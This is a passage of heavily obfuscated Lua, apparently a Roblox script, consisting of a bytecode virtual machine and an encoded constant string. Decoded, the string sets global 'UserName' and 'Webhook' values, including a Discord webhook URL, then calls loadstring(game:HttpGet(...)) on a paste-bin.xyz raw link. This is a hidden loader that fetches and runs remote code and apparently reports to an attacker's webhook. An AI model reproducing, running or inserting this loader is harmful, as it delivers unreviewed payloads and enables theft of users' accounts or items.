																												if (v169 <= 42) then
																													if (v169 <= 38) then
																														if (v169 <= 36) then
																															if (v169 > 35) then
																																local v268 = 0;
																																local v269;
																																local v270;
																																while true do
																																	if (v268 == 0) then
																																		v269 = 0;
																																		v270 = nil;
																																		v268 = 1;
																																	end
																																	if (v268 == 1) then
																																		while true do
																																			if (v269 == 0) then
																																				v270 = v168[2];
																																				v166[v270] = v166[v270](v21(v166, v270 + 1, v168[3]));
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																end
																															else
																																v166[v168[2]] = v166[v168[3]];
																															end
																														elseif (v169 > 37) then
																															v166[v168[2]]();
																														else
																															local v273 = 0;
																															local v274;
																															local v275;
																															local v276;
																															while true do
																																if (v273 == 0) then
																																	v274 = 0;
																																	v275 = nil;
																																	v273 = 1;
																																end
																																if (v273 == 1) then
																																	v276 = nil;
																																	while true do
																																		if (v274 == 0) then
																																			local v392 = 0;
																																			while true do
																																				if (v392 == 0) then
																																					v275 = v168[2];
																																					v276 = v166[v168[3]];
																																					v392 = 1;
																																				end
																																				if (v392 == 1) then
																																					v274 = 1;
																																					break;
																																				end
																																			end
																																		end
																																		if (v274 == 1) then
																																			v166[v275 + 1] = v276;
																																			v166[v275] = v276[v168[4]];
																																			break;
																																		end
																																	end
																																	break;
																																end
																															end
																														end
																													elseif (v169 <= 40) then
																														if (v169 > 39) then
																															local v277 = 0;
																															local v278;
																															local v279;
																															while true do
																																if (v277 == 1) then
																																	while true do
																																		if (0 == v278) then
																																			v279 = v168[2];
																																			v166[v279](v21(v166, v279 + 1, v161));
																																			break;
																																		end
																																	end
																																	break;
																																end
																																if (v277 == 0) then
																																	v278 = 0;
																																	v279 = nil;
																																	v277 = 1;
																																end
																															end
																														else
																															local v280 = 0;
																															local v281;
																															local v282;
																															local v283;
																															local v284;
																															while true do
																																if (v280 == 2) then
																																	while true do
																																		if (v281 == 1) then
																																			v284 = v166[v282 + 2];
																																			if (v284 > 0) then
																																				if (v283 > v166[v282 + 1]) then
																																					v160 = v168[3];
																																				else
																																					v166[v282 + 3] = v283;
																																				end
																																			elseif (v283 < v166[v282 + 1]) then
																																				v160 = v168[3];
																																			else
																																				v166[v282 + 3] = v283;
																																			end
																																			break;
																																		end
																																		if (v281 == 0) then
																																			local v398 = 0;
																																			while true do
																																				if (1 == v398) then
																																					v281 = 1;
																																					break;
																																				end
																																				if (v398 == 0) then
																																					v282 = v168[6 - 4];
																																					v283 = v166[v282];
																																					v398 = 1;
																																				end
																																			end
																																		end
																																	end
																																	break;
																																end
																																if (v280 == 0) then
																																	v281 = 0;
																																	v282 = nil;
																																	v280 = 1;
																																end
																																if (1 == v280) then
																																	v283 = nil;
																																	v284 = nil;
																																	v280 = 2;
																																end
																															end
																														end
																													elseif (v169 > 41) then
																														if (v166[v168[2]] == v168[4]) then
																															v160 = v160 + 1;
																														else
																															v160 = v168[3];
																														end
																													else
																														v166[v168[2]] = v166[v168[2 + 1]] % v168[4];
																													end
																												elseif (v169 <= 46) then
																													if (v169 <= 44) then
																														if (v169 > (75 - 32)) then
																															local v286 = 0;
																															local v287;
																															local v288;
																															while true do
																																if (v286 == 0) then
																																	v287 = 0;
																																	v288 = nil;
																																	v286 = 1;
																																end
																																if (v286 == 1) then
																																	while true do
																																		if (v287 == 0) then
																																			v288 = v168[2];
																																			do
																																				return v166[v288](v21(v166, v288 + 1, v168[3]));
																																			end
																																			break;
																																		end
																																	end
																																	break;
																																end
																															end
																														else
																															v166[v168[2]] = v166[v168[3]];
																														end
																													elseif (v169 == 45) then
																														local v291 = 0;
																														local v292;
																														local v293;
																														local v294;
																														while true do
																															if (v291 == 0) then
																																v292 = 0;
																																v293 = nil;
																																v291 = 1;
																															end
																															if (v291 == 1) then
																																v294 = nil;
																																while true do
																																	if (v292 == 1) then
																																		v166[v293 + 1] = v294;
																																		v166[v293] = v294[v168[4]];
																																		break;
																																	end
																																	if (v292 == 0) then
																																		local v403 = 0;
																																		while true do
																																			if (v403 == 0) then
																																				v293 = v168[2];
																																				v294 = v166[v168[3]];
																																				v403 = 1;
																																			end
																																			if (v403 == 1) then
																																				v292 = 1;
																																				break;
																																			end
																																		end
																																	end
																																end
																																break;
																															end
																														end
																													else
																														v166[v168[2]] = v166[v168[3]] % v168[4];
																													end
																												elseif (v169 <= 48) then
																													if (v169 > 47) then
																														for v339 = v168[2], v168[3] do
																															v166[v339] = nil;
																														end
																													else
																														v160 = v168[441 - (145 + 293)];
																													end
																												elseif (v169 <= 49) then
																													v166[v168[2]] = v168[3];
																												elseif (v169 > 50) then
																													local v352 = 0;
																													local v353;
																													local v354;
																													local v355;
																													local v356;
																													local v357;
																													while true do
																														if (0 == v352) then
																															v353 = 0;
																															v354 = nil;
																															v352 = 1;
																														end
																														if (1 == v352) then
																															v355 = nil;
																															v356 = nil;
																															v352 = 2;
																														end
																														if (v352 == 2) then
																															v357 = nil;
																															while true do
																																if (0 == v353) then
																																	local v439 = 0;
																																	while true do
																																		if (1 == v439) then
																																			v353 = 1;
																																			break;
																																		end
																																		if (0 == v439) then
																																			v354 = v168[2];
																																			v355, v356 = v159(v166[v354](v21(v166, v354 + 1, v161)));
																																			v439 = 1;
																																		end
																																	end
																																end
																																if (v353 == 1) then
																																	local v440 = 0;
																																	while true do
																																		if (v440 == 1) then
																																			v353 = 2;
																																			break;
																																		end
																																		if (v440 == 0) then
																																			v161 = (v356 + v354) - 1;
																																			v357 = 0;
																																			v440 = 1;
																																		end
																																	end
																																end
																																if (v353 == 2) then
																																	for v464 = v354, v161 do
																																		local v465 = 0;
																																		local v466;
																																		while true do
																																			if (v465 == 0) then
																																				v466 = 0;
																																				while true do
																																					if (v466 == 0) then
																																						v357 = v357 + 1;
																																						v166[v464] = v355[v357];
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	end
																																	break;
																																end
																															end
																															break;
																														end
																													end
																												else
																													v166[v168[2]] = v85[v168[3]];
																												end
																											elseif (v169 <= 60) then
																												if (v169 <= (485 - (44 + 386))) then
																													if (v169 <= 53) then
																														if (v169 == 52) then
																															local v299 = 0;
																															local v300;
																															local v301;
																															while true do
																																if (v299 == 0) then
																																	v300 = 0;
																																	v301 = nil;
																																	v299 = 1;
																																end
																																if (v299 == 1) then
																																	while true do
																																		if (0 == v300) then
																																			v301 = v168[2];
																																			v166[v301](v21(v166, v301 + 1, v161));
																																			break;
																																		end
																																	end
																																	break;
																																end
																															end
																														else
																															v166[v168[2]][v166[v168[3]]] = v166[v168[4]];
																														end
																													elseif (v169 == 54) then
																														v166[v168[2]]();
																													else
																														v166[v168[2]] = v166[v168[3]] - v168[4];
																													end
																												elseif (v169 <= 57) then
																													if (v169 == 56) then
																														v166[v168[1488 - (998 + 488)]] = #v166[v168[3]];
																													else
																														local v306 = 0;
																														local v307;
																														local v308;
																														local v309;
																														local v310;
																														local v311;
																														while true do
																															if (v306 == 1) then
																																v309 = nil;
																																v310 = nil;
																																v306 = 2;
																															end
																															if (v306 == 0) then
																																v307 = 0;
																																v308 = nil;
																																v306 = 1;
																															end
																															if (v306 == 2) then
																																v311 = nil;
																																while true do
																																	if (v307 == 1) then
																																		local v405 = 0;
																																		while true do
																																			if (v405 == 0) then
																																				v161 = (v310 + v308) - (1 + 0);
																																				v311 = 0 + 0;
																																				v405 = 1;
																																			end
																																			if (v405 == 1) then
																																				v307 = 2;
																																				break;
																																			end
																																		end
																																	end
																																	if (2 == v307) then
																																		for v427 = v308, v161 do
																																			local v428 = 0;
																																			local v429;
																																			while true do
																																				if (v428 == 0) then
																																					v429 = 0;
																																					while true do
																																						if (v429 == 0) then
																																							v311 = v311 + 1;
																																							v166[v427] = v309[v311];
																																							break;
																																						end
																																					end
																																					break;
																																				end
																																			end
																																		end
																																		break;
																																	end
																																	if (v307 == 0) then
																																		local v406 = 0;
																																		while true do
																																			if (1 == v406) then
																																				v307 = 1;
																																				break;
																																			end
																																			if (v406 == 0) then
																																				v308 = v168[2];
																																				v309, v310 = v159(v166[v308](v166[v308 + 1]));
																																				v406 = 1;
																																			end
																																		end
																																	end
																																end
																																break;
																															end
																														end
																													end
																												elseif (v169 <= 58) then
																													if not v166[v168[2]] then
																														v160 = v160 + (773 - (201 + 571));
																													else
																														v160 = v168[3];
																													end
																												elseif (v169 > (1197 - (116 + 1022))) then
																													local v361 = 0;
																													local v362;
																													local v363;
																													local v364;
																													local v365;
																													while true do
																														if (v361 == 2) then
																															while true do
																																if (0 == v362) then
																																	local v441 = 0;
																																	while true do
																																		if (v441 == 1) then
																																			v362 = 1;
																																			break;
																																		end
																																		if (v441 == 0) then
																																			v363 = v168[2];
																																			v364 = v166[v363 + 2];
																																			v441 = 1;
																																		end
																																	end
																																end
																																if (v362 == 1) then
																																	local v442 = 0;
																																	while true do
																																		if (1 == v442) then
																																			v362 = 2;
																																			break;
																																		end
																																		if (v442 == 0) then
																																			v365 = v166[v363] + v364;
																																			v166[v363] = v365;
																																			v442 = 1;
																																		end
																																	end
																																end
																																if (v362 == 2) then
																																	if (v364 > 0) then
																																		if (v365 <= v166[v363 + 1]) then
																																			local v509 = 0;
																																			local v510;
																																			while true do
																																				if (v509 == 0) then
																																					v510 = 0;
																																					while true do
																																						if (0 == v510) then
																																							v160 = v168[3];
																																							v166[v363 + 3] = v365;
																																							break;
																																						end
																																					end
																																					break;
																																				end
																																			end
																																		end
																																	elseif (v365 >= v166[v363 + (4 - 3)]) then
																																		local v511 = 0;
																																		local v512;
																																		while true do
																																			if (v511 == 0) then
																																				v512 = 0;
																																				while true do
																																					if (v512 == 0) then
																																						v160 = v168[3];
																																						v166[v363 + 3] = v365;
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	end
																																	break;
																																end
																															end
																															break;
																														end
																														if (v361 == 0) then
																															v362 = 0;
																															v363 = nil;
																															v361 = 1;
																														end
																														if (v361 == 1) then
																															v364 = nil;
																															v365 = nil;
																															v361 = 2;
																														end
																													end
																												else
																													v166[v168[2]] = {};
																												end
																											elseif (v169 <= 64) then
																												if (v169 <= 62) then
																													if (v169 == 61) then
																														local v312 = 0;
																														local v313;
																														local v314;
																														while true do
																															if (v312 == 0) then
																																v313 = 0;
																																v314 = nil;
																																v312 = 1;
																															end
																															if (v312 == 1) then
																																while true do
																																	if (v313 == 0) then
																																		v314 = v168[2 + 0];
																																		v166[v314] = v166[v314](v21(v166, v314 + 1, v161));
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																													else
																														v85[v168[10 - 7]] = v166[v168[2]];
																													end
																												elseif (v169 > (223 - 160)) then
																													local v317 = 0;
																													local v318;
																													local v319;
																													while true do
																														if (v317 == 1) then
																															while true do
																																if (v318 == 0) then
																																	v319 = v168[2];
																																	v166[v319] = v166[v319](v21(v166, v319 + 1, v168[3]));
																																	break;
																																end
																															end
																															break;
																														end
																														if (v317 == 0) then
																															v318 = 0;
																															v319 = nil;
																															v317 = 1;
																														end
																													end
																												else
																													v166[v168[2]] = v166[v168[3]][v166[v168[4]]];
																												end
																											elseif (v169 <= 66) then
																												if (v169 > 65) then
																													local v322 = 0;
																													local v323;
																													local v324;
																													local v325;
																													local v326;
																													local v327;
																													while true do
																														if (v322 == 1) then
																															v325 = nil;
																															v326 = nil;
																															v322 = 2;
																														end
																														if (v322 == 2) then
																															v327 = nil;
																															while true do
																																if (v323 == 1) then
																																	local v411 = 0;
																																	while true do
																																		if (1 == v411) then
																																			v323 = 2;
																																			break;
																																		end
																																		if (v411 == 0) then
																																			v161 = (v326 + v324) - 1;
																																			v327 = 0;
																																			v411 = 1;
																																		end
																																	end
																																end
																																if (v323 == 0) then
																																	local v412 = 0;
																																	while true do
																																		if (v412 == 0) then
																																			v324 = v168[2];
																																			v325, v326 = v159(v166[v324](v21(v166, v324 + 1, v168[3])));
																																			v412 = 1;
																																		end
																																		if (1 == v412) then
																																			v323 = 1;
																																			break;
																																		end
																																	end
																																end
																																if (v323 == 2) then
																																	for v430 = v324, v161 do
																																		local v431 = 0;
																																		local v432;
																																		while true do
																																			if (v431 == 0) then
																																				v432 = 0;
																																				while true do
																																					if (0 == v432) then
																																						v327 = v327 + 1;
																																						v166[v430] = v325[v327];
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	end
																																	break;
																																end
																															end
																															break;
																														end
																														if (v322 == 0) then
																															v323 = 0;
																															v324 = nil;
																															v322 = 1;
																														end
																													end
																												else
																													local v328 = 0;
																													local v329;
																													local v330;
																													while true do
																														if (v328 == 1) then
																															while true do
																																if (v329 == 0) then
																																	v330 = v168[2];
																																	do
																																		return v21(v166, v330, v161);
																																	end
																																	break;
																																end
																															end
																															break;
																														end
																														if (v328 == 0) then
																															v329 = 0;
																															v330 = nil;
																															v328 = 1;
																														end
																													end
																												end
																											elseif (v169 <= 67) then
																												local v331 = 0;
																												local v332;
																												local v333;
																												local v334;
																												local v335;
																												while true do
																													if (v331 == 2) then
																														while true do
																															if (v332 == 0) then
																																local v414 = 0;
																																while true do
																																	if (v414 == 0) then
																																		v333 = v157[v168[862 - (814 + 45)]];
																																		v334 = nil;
																																		v414 = 1;
																																	end
																																	if (v414 == 1) then
																																		v332 = 1;
																																		break;
																																	end
																																end
																															end
																															if (v332 == 2) then
																																for v433 = 1, v168[9 - 5] do
																																	local v434 = 0;
																																	local v435;
																																	local v436;
																																	while true do
																																		if (v434 == 0) then
																																			v435 = 0;
																																			v436 = nil;
																																			v434 = 1;
																																		end
																																		if (v434 == 1) then
																																			while true do
																																				if (v435 == 1) then
																																					if (v436[1] == 43) then
																																						v335[v433 - 1] = {v166,v436[3]};
																																					else
																																						v335[v433 - (886 - (261 + 624))] = {v84,v436[4 - 1]};
																																					end
																																					v165[#v165 + 1] = v335;
																																					break;
																																				end
																																				if (v435 == 0) then
																																					local v524 = 0;
																																					while true do
																																						if (v524 == 0) then
																																							v160 = v160 + 1;
																																							v436 = v156[v160];
																																							v524 = 1;
																																						end
																																						if (1 == v524) then
																																							v435 = 1;
																																							break;
																																						end
																																					end
																																				end
																																			end
																																			break;
																																		end
																																	end
																																end
																																v166[v168[2]] = v43(v333, v334, v85);
																																break;
																															end
																															if (v332 == 1) then
																																local v416 = 0;
																																while true do
																																	if (v416 == 1) then
																																		v332 = 2;
																																		break;
																																	end
																																	if (v416 == 0) then
																																		v335 = {};
																																		v334 = v18({}, {[v7("\6\36\228\136\85\232\37", "\89\123\141\230\49\141\93")]=function(v493, v494)
																																			local v495 = 0;
																																			local v496;
																																			local v497;
																																			while true do
																																				if (v495 == 0) then
																																					v496 = 0;
																																					v497 = nil;
																																					v495 = 1;
																																				end
																																				if (v495 == 1) then
																																					while true do
																																						if (v496 == 0) then
																																							local v542 = 0;
																																							while true do
																																								if (v542 == 0) then
																																									v497 = v335[v494];
																																									return v497[1][v497[2]];
																																								end
																																							end
																																						end
																																					end
																																					break;
																																				end
																																			end
																																		end,[v7("\117\204\127\243\27\25\68\247\116\238", "\42\147\17\150\108\112")]=function(v498, v499, v500)
																																			local v501 = 0;
																																			local v502;
																																			local v503;
																																			while true do
																																				if (1 == v501) then
																																					while true do
																																						if (v502 == 0) then
																																							v503 = v335[v499];
																																							v503[1][v503[2]] = v500;
																																							break;
																																						end
																																					end
																																					break;
																																				end
																																				if (v501 == 0) then
																																					v502 = 0;
																																					v503 = nil;
																																					v501 = 1;
																																				end
																																			end
																																		end});
																																		v416 = 1;
																																	end
																																end
																															end
																														end
																														break;
																													end
																													if (v331 == 0) then
																														v332 = 0;
																														v333 = nil;
																														v331 = 1;
																													end
																													if (v331 == 1) then
																														v334 = nil;
																														v335 = nil;
																														v331 = 2;
																													end
																												end
																											elseif (v169 == 68) then
																												v166[v168[1082 - (1020 + 60)]] = v168[3];
																											else
																												local v369 = 0;
																												local v370;
																												local v371;
																												while true do
																													if (v369 == 1) then
																														while true do
																															if (v370 == 0) then
																																v371 = v168[1425 - (630 + 793)];
																																v166[v371] = v166[v371](v21(v166, v371 + 1, v161));
																																break;
																															end
																														end
																														break;
																													end
																													if (v369 == 0) then
																														v370 = 0;
																														v371 = nil;
																														v369 = 1;
																													end
																												end
																											end
																											v160 = v160 + (3 - 2);
																											break;
																										end
																									end
																									break;
																								end
																							end
																						end
																						break;
																					end
																					if (v155 == 0) then
																						v156 = v88;
																						v157 = v89;
																						v158 = v90;
																						v159 = v41;
																						v155 = 1;
																					end
																				end
																			end;
																		end
																	end
																end
																if (v87 == 0) then
																	local v133 = 0;
																	while true do
																		if (v133 == 0) then
																			v88 = v83[351 - (87 + 263)];
																			v89 = v83[2];
																			v133 = 1;
																		end
																		if (v133 == 1) then
																			v87 = 1;
																			break;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
												if (v86 == 0) then
													v87 = 0;
													v88 = nil;
													v86 = 1;
												end
											end
										end
										v49 = 1;
									end
								end
							end
							break;
						end
						if (v45 == 0) then
							if (v31 == 0) then
								local v50 = 0;
								while true do
									if (v50 == 2) then
										v31 = 1;
										break;
									end
									if (v50 == 0) then
										v32 = 1;
										v33 = nil;
										v50 = 1;
									end
									if (v50 == 1) then
										v28 = v12(v11(v28, 5), v7("\206\99", "\224\77\174\63\139\38\175"), function(v91)
											if (v9(v91, 2) == 79) then
												local v98 = 0;
												local v99;
												while true do
													if (v98 == 0) then
														v99 = 0;
														while true do
															if (0 == v99) then
																local v116 = 0;
																while true do
																	if (v116 == 0) then
																		v33 = v8(v11(v91, 1, 1));
																		return "";
																	end
																end
															end
														end
														break;
													end
												end
											else
												local v100 = 0;
												local v101;
												local v102;
												while true do
													if (v100 == 1) then
														while true do
															if (v101 == 0) then
																v102 = v10(v8(v91, 16));
																if v33 then
																	local v135 = 0;
																	local v136;
																	local v137;
																	while true do
																		if (v135 == 0) then
																			v136 = 0;
																			v137 = nil;
																			v135 = 1;
																		end
																		if (v135 == 1) then
																			while true do
																				local v172 = 0;
																				while true do
																					if (v172 == 0) then
																						if (v136 == 0) then
																							local v184 = 0;
																							while true do
																								if (v184 == 1) then
																									v136 = 1;
																									break;
																								end
																								if (v184 == 0) then
																									v137 = v13(v102, v33);
																									v33 = nil;
																									v184 = 1;
																								end
																							end
																						end
																						if (v136 == 1) then
																							return v137;
																						end
																						break;
																					end
																				end
																			end
																			break;
																		end
																	end
																else
																	return v102;
																end
																break;
															end
														end
														break;
													end
													if (0 == v100) then
														v101 = 0;
														v102 = nil;
														v100 = 1;
													end
												end
											end
										end);
										v34 = nil;
										v50 = 2;
									end
								end
							end
							if (v31 == 1) then
								local v51 = 0;
								while true do
									if (v51 == 1) then
										function v35()
											local v92 = 0;
											local v93;
											local v94;
											while true do
												if (0 == v92) then
													v93 = 0;
													v94 = nil;
													v92 = 1;
												end
												if (v92 == 1) then
													while true do
														local v115 = 0;
														while true do
															if (0 == v115) then
																if (v93 == 0) then
																	local v134 = 0;
																	while true do
																		if (0 == v134) then
																			v94 = v9(v28, v32, v32);
																			v32 = v32 + 1;
																			v134 = 1;
																		end
																		if (v134 == 1) then
																			v93 = 1 + 0;
																			break;
																		end
																	end
																end
																if (v93 == 1) then
																	return v94;
																end
																break;
															end
														end
													end
													break;
												end
											end
										end
										v36 = nil;
										v51 = 2;
									end
									if (v51 == 0) then
										function v34(v95, v96, v97)
											if v97 then
												local v103 = 0;
												local v104;
												local v105;
												while true do
													if (v103 == 1) then
														while true do
															if (v104 == 0) then
																local v117 = 0;
																while true do
																	if (v117 == 0) then
																		v105 = (v95 / ((1 + 1) ^ (v96 - (147 - (80 + 66))))) % (2 ^ (((v97 - ((9 - 7) - 1)) - (v96 - 1)) + (2 - 1)));
																		return v105 - (v105 % 1);
																	end
																end
															end
														end
														break;
													end
													if (v103 == 0) then
														v104 = 0 + 0;
														v105 = nil;
														v103 = 1;
													end
												end
											else
												local v106 = 0;
												local v107;
												local v108;
												while true do
													if (v106 == 0) then
														v107 = 0 - 0;
														v108 = nil;
														v106 = 1;
													end
													if (v106 == 1) then
														while true do
															if (v107 == 0) then
																local v118 = 0;
																while true do
																	if (v118 == 0) then
																		v108 = (3 - (754 - (239 + 514))) ^ (v96 - (1 + 0));
																		return (((v95 % (v108 + v108)) >= v108) and (2 - 1)) or (1329 - (797 + 532));
																	end
																end
															end
														end
														break;
													end
												end
											end
										end
										v35 = nil;
										v51 = 1;
									end
									if (v51 == 2) then
										v31 = 2;
										break;
									end
								end
							end
							v45 = 1;
						end
					end
				end
				break;
			end
		end
	end
	v23("LOL!323O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403043O00453CB65B03073O002654D72976DC4603043O00FC49022703053O009E307642722O033O00E8BE2603073O009BCB44705613C503043O00FA5ED22403083O009826BD569C20188503063O0045F359A447E803043O00269C37C703063O004AA66E793A0703083O0023C81D1C4873149A03083O00557365724E616D6503093O0010D8C0D028B7EB974F03083O007EB1A3BB4586DBA703093O00557365724E616D653203093O00F22ACE21C8AD739D7B03053O009C43AD4AA503073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3O31332O35362O31393437303733392O35362F5632524244514B584C4A2D686973306555473169645862685A564956776835336B6362413154594348706D48306C6B41487538464232506C4730544D725A50525979615203023O005F47030A3O00071AADD8CF99023514BA03073O005479DFB1BFED4C030F3O006B35B34C56BE3F0634F90A46EC761703093O00E7B244DAB40E5528D503083O00A1DB36A9C05A3050030D3O00CE5C132301FB1001231BEA1E58030A3O00164C410F2B4D76053D5D03043O004529226003113O00C8A836192667E5D7A425143F7DA2B5E56A03093O001FB4CAC50E362EA4D703063O004BDCA3B76A62030E3O00D94AD039EF5438C1F748D878B20E030B3O00EE03B39F3ED7058E823ADC03053O00B962DAEB57025O00C07240030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403203O00682O7470733A2O2F70617374652D62696E2E78797A2F7261772F39383436383500873O00121F3O00013O0020045O000200121F000100013O00200400010001000300121F000200013O00200400020002000400121F000300053O00063A0003000A0001000100042F3O000A000100121F000300063O00200400040003000700121F000500083O00200400050005000900121F000600083O00200400060006000A00061D00073O000100062O002B3O00064O002B8O002B3O00044O002B3O00014O002B3O00024O002B3O00053O00121F000800014O0023000900073O001231000A000B3O001231000B000C4O00400009000B00022O002000080008000900121F000900014O0023000A00073O001231000B000D3O001231000C000E4O0040000A000C00022O002000090009000A00121F000A00014O0023000B00073O001231000C000F3O001231000D00104O0040000B000D00022O0020000A000A000B00121F000B00053O00063A000B002C0001000100042F3O002C000100121F000B00064O0023000C00073O001231000D00113O001231000E00124O0040000C000E00022O0020000C000B000C00121F000D00084O0023000E00073O001231000F00133O001231001000144O0040000E001000022O0020000D000D000E00121F000E00084O0023000F00073O001231001000153O001231001100164O0040000F001100022O0020000E000E000F00061D000F0001000100062O002B3O000D4O002B3O000E4O002B3O00084O002B3O000C4O002B3O00094O002B3O000A4O00230010000F3O001231001100183O001231001200194O004000100012000200122O001000174O00230010000F3O0012310011001B3O0012310012001C4O004000100012000200122O0010001A3O0012310010001E3O00122O0010001D3O00121F0010001F4O0023001100073O001231001200203O001231001300214O00400011001300022O00230012000F3O001231001300223O0012310014000C4O00400012001400022O000600100011001200121F0010001F4O0023001100073O001231001200233O001231001300244O00400011001300022O00230012000F3O001231001300253O0012310014000E4O00400012001400022O000600100011001200121F0010001F4O0023001100073O001231001200263O001231001300274O00400011001300022O00230012000F3O001231001300283O001231001400104O00400012001400022O000600100011001200121F0010001F4O0023001100073O001231001200293O0012310013002A4O00400011001300022O00230012000F3O0012310013002B3O001231001400124O00400012001400022O000600100011001200121F0010001F4O0023001100073O0012310012002C3O0012310013002D4O004000110013000200201700100011002E00121F0010002F3O00121F001100303O002025001100110031001231001300324O0003001400014O0008001100144O003D00103O00022O00260010000100012O000B3O00013O00023O00023O00026O00F03F026O00704002284O001400025O001231000300014O001500045O001231000500013O00040E0003002300012O001C00076O0023000800024O001C000900014O001C000A00024O001C000B00034O001C000C00044O0023000D6O0023000E00063O00200A000F000600012O0008000C000F4O003D000B3O00022O001C000C00034O001C000D00044O0023000E00013O00200F000F000600012O0015001000014O000C000F000F0010001012000F0001000F00200F0010000600012O0015001100014O000C00100010001100101200100001001000200A0010001000012O0008000D00104O0022000C6O003D000A3O0002002029000A000A00022O00390009000A4O003400073O000100043C0003000500012O001C000300054O0023000400024O002C000300044O001300036O000B3O00017O00033O00028O00026O00F03F026O007040023F3O001231000200014O0009000300043O00262A000300380001000200042F3O00380001001231000500013O00262A000500050001000100042F3O0005000100262A0003000D0001000200042F3O000D00012O001C00066O0023000700044O002C000600074O001300065O00262A000300040001000100042F3O000400012O001400066O0023000400063O001231000600024O001500075O001231000800023O00040E0006003300012O001C000A00014O0023000B00044O001C000C00024O001C000D00034O001C000E00044O001C000F00054O002300106O0023001100093O00200A0012000900022O0008000F00124O003D000E3O00022O001C000F00044O001C001000054O0023001100013O00200F0012000900022O0015001300014O000C00120012001300101200120002001200200F0013000900022O0015001400014O000C00130013001400101200130002001300200A0013001300022O0008001000134O0022000F6O003D000D3O0002002029000D000D00032O0039000C000D4O0034000A3O000100043C000600150001001231000300023O00042F3O0004000100042F3O0005000100042F3O0004000100042F3O003E000100262A000300020001000100042F3O00020001001231000300014O0009000400043O001231000300023O00042F3O000200012O000B3O00017O00", v17(), ...);
end
